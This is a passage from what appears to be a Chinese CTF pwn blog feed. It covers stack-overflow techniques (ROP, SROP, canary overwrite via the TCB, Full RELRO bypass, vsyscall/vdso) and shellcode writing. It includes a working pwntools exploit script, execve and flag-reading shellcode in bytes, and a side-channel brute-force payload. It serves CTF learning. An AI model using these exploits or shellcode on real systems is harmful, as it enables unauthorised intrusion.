class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ezrop&#x27;</span>)</span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./ezrop&#x27;)</span></span><br><span class="line"></span><br><span class="line">m = u64(p.recv(<span class="number">40</span>)[-<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x400863</span>) + <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(<span class="number">0x400600</span>)</span><br><span class="line"></span><br><span class="line">payloads += cyclic(<span class="number">0x18</span>)</span><br><span class="line">payloads += p64(<span class="number">0x601848</span>+<span class="number">0x30</span>) + p64(<span class="number">0x4007d9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x4006fa</span>) + p64(<span class="number">0x400863</span>) + p64(<span class="number">0x601868</span>) + p64(<span class="number">0x400600</span>) </span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += p64(<span class="number">0x601848</span>-<span class="number">0x8</span>) + p64(<span class="number">0x4007f9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00007f7b3ce92bb0      0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure><h4 id="栈对齐">栈对齐</h4><p>栈对齐是xmm指令的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p><p>这个特性来源于xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p><p>可以:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -c core</span><br></pre></td></tr></table></figure><p>调试core文件</p><p>如果终止指令类似于:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0</span><br></pre></td></tr></table></figure><p>说明是栈对齐的原因，小心调整栈帧就行</p><h4 id="Stack-smash">Stack smash</h4><p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p><p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0]  (在栈上，和环境变脸在一起)指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p><h4 id="SROP">SROP</h4><h5 id="前置知识-2">前置知识:</h5><p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p><p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p><p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p><p>SROP简要流程:</p><ol><li>构造fake_frame</li><li>控制当前rsp指向fake_frame底部</li><li>sigreturn调用</li></ol><p>sigFrame结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="pwntools-srop">pwntools.srop</h5><p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 一个简单的例子</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure><h4 id="stack-gaurd">stack_gaurd</h4><p>我们都知道canary来自<code>fs:0x28</code>， <code>fs</code> 实际上指向的是<a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">TCB</a> ， TCB结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;                <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;                <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;  <span class="comment">// not in 32bit</span></span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>0x28的偏移实际上是指向的stack_guard</p><p>那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择<code>pthread_self()</code> 来查看<code>fs</code>的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_t</span></span><br><span class="line"><span class="title function_">pthread_self</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">pthread_t</span>) THREAD_SELF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在gdb中查看这个地址，发现这个地址实际上在libc的附近。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())</span><br><span class="line">p/x (void*)(pthread_self())</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x (void*)(pthread_self())</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">16 = 0x7ffff7fa8680</span></span><br></pre></td></tr></table></figure><p>如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。</p><p>但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程<code>fs</code> 寄存器地址的，所以可以通过此来实现覆盖。</p><h4 id="bypass-Full-RELRO">bypass Full RELRO</h4><p>在没有leak函数，并且Full RELRO 的情况下， ret2dl_resolve就无法使用了。</p><p>因为got不再可写，partial overwrite也无法再使用。</p><p>那么可以找数据移动的gadget将got 表里面的值读入bss段，然后对bss段上的值进行partial overwrite， 或者通过add、sub等gadget拼出目标libc值，再栈迁移到bss段， 就可以ret到lbss段上的libc地址，从而劫持控制流。</p><h3 id="vsyscall-vdso">vsyscall/vdso</h3><p>vsyscall 和 vdso 都是内核留下的用于加速系统调用的接口，也因此，其根据内核版本的不同而有所不同。</p><p>可以随便开一个程序看一下他们各自的加载地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="number">0x7ffff7fc4000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fca000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"> </span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span>      <span class="number">0</span> [vsyscall]</span><br></pre></td></tr></table></figure><p>先来说vsyscall, 里面实现了三个函数：</p><p>0xffffffffff600000, gettimeofday<br>0xffffffffff600400, time<br>0xffffffffff600800, getcpu</p><p>并且vsyscall 的加载地址是固定的，但是由于其执行有检查，必须从以上三个函数开始的地址来运行，所以也就只能执行以上三个函数，更多的作用是在栈溢出完全无leak时，将此作为gadget滑块，让程序运行到有效libc地址。</p><p>不过，在许多发行版中，这个功能已经被裁剪。</p><p><a href="https://lwn.net/Articles/615809/">vDSO</a></p><p>相对而言灵活很多，他类似与一个共享库，如果你用gdb将其dump下来，会发现他甚至有完整的ELF结构。</p><p>然而，其加载地址却会受到随机化的影响，在32位的程序中，这个随机化的偏移是可爆破的程度，然而在64位的系统中，就完全不可能了。</p><p>不过在loader在加载过程中会在栈上留下其地址，在所有环境变量的上面一点的偏移，如果存在leak，就可以劫持。</p><p>不过，一个更大的问题的，由于这是内核提供的一个接口，vDSO具体内容随内核版本有所不同，除非你能dump出远程的vDSO，否则很难利用。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;杂谈&quot;&gt;杂谈&lt;/h3&gt;
&lt;p&gt;作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="pwn" scheme="https://v3rdant.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.the-Art-of-Shellcode</title>
    <link href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/"/>
    <id>https://v3rdant.cn/Pwn.The-Art-of-Shellcode/</id>
    <published>2022-07-30T16:00:00.000Z</published>
    <updated>2024-01-12T13:06:54.961Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic">Basic</h1><p>首先给出两个常用shellcode仓库，可以检索需要的shellcode</p><ul><li><a href="https://shell-storm.org/shellcode/index.html">shellcode database</a></li><li><a href="https://www.exploit-db.com/google-hacking-database">exploit-db</a></li></ul><span id="more"></span><p>接下来给出几个尽可能短的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; excve(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,0)</span><br><span class="line">; rax: 0x3b</span><br><span class="line">; rdi: &#x27;/bin/sh&#x27; </span><br><span class="line">; rsi: &#x27;sh&#x27; </span><br><span class="line">; rdx; NULL</span><br></pre></td></tr></table></figure><h2 id="最短shellcode">最短shellcode</h2><h3 id="特征与条件">特征与条件</h3><p>长度为22字节<br>主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r/m64指令，实现清空rax和rdx</p><ul><li>eax 高二位必须为0，一般是满足的</li></ul><h3 id="汇编">汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor rsi, rsi</span><br><span class="line">pushrsi</span><br><span class="line">mov rdi, 0x68732f2f6e69622f</span><br><span class="line">pushrdi</span><br><span class="line">pushrsp</span><br><span class="line">pop    rdi</span><br><span class="line">mov al,59</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi</span><br><span class="line">56                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq     ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br></pre></td></tr></table></figure><h3 id="字节码">字节码</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// int</span><br><span class="line">0x622fbf4856f63148</span><br><span class="line">0x545768732f2f6e69</span><br><span class="line">0x050f993bb05f</span><br><span class="line"></span><br><span class="line">// bytes</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure><h2 id="orw">orw</h2><h3 id="特征与条件-2">特征与条件</h3><p>长度为0x28字节<br>主要是通过异或实现了取代了mov减少长度</p><ul><li>rsp指向的地址必须是可用的</li><li>存在NULL字符</li></ul><h3 id="汇编-2">汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// rdx为写入数量</span><br><span class="line">mov rdx, 0x200</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi  #如果本来rsi=0，可以删掉这句</span><br><span class="line">mov eax,2</span><br><span class="line">syscall</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">xor edi,2  </span><br><span class="line">mov eax,edi</span><br><span class="line">syscall  </span><br></pre></td></tr></table></figure><h3 id="字节码-2">字节码</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6800000200c2c748</span><br><span class="line">0x31e7894867616c66</span><br><span class="line">0x050f00000002b8f6</span><br><span class="line">0x0fc031e68948c789</span><br><span class="line">0x050ff88902f78305</span><br><span class="line"></span><br><span class="line">\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05</span><br></pre></td></tr></table></figure><h3 id="可指定地址orw">可指定地址orw</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov dh, 0x2</span></span><br><span class="line"><span class="string">mov rdi,&#123;&#125;</span></span><br><span class="line"><span class="string">xor esi,esi  </span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rsi,rdi</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor edi,2</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(target_addr + <span class="number">0xb0</span>))</span><br></pre></td></tr></table></figure><h2 id="侧信道爆破">侧信道爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">push SYS_open</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 6</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, 0x10100</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">cmp cl, dl</span></span><br><span class="line"><span class="string">jz loop</span></span><br><span class="line"><span class="string">mov al,231</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(offset, ch)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="字符限制">字符限制</h1><h2 id="编码工具">编码工具</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">ae64</th><th><a href="https://github.com/SkyLined/alpha3">alpha3</a></th></tr></thead><tbody><tr><td style="text-align:center">Encode x32 alphanumeric shellcode</td><td style="text-align:center">x</td><td>✔</td></tr><tr><td style="text-align:center">Encode x64 alphanumeric shellcode</td><td style="text-align:center">✔</td><td>✔</td></tr><tr><td style="text-align:center">Original shellcode can contain zero bytes</td><td style="text-align:center">✔</td><td>x</td></tr><tr><td style="text-align:center">Base address register can contain offset</td><td style="text-align:center">✔</td><td>x</td></tr></tbody></table><h4 id="Alpha3">Alpha3</h4><p>限制只能使用字母或者数字<br>alpha3使用:<br>alpha3需要python2环境，所以先安装python2</p><figure class="highlight python"><table><tr><td 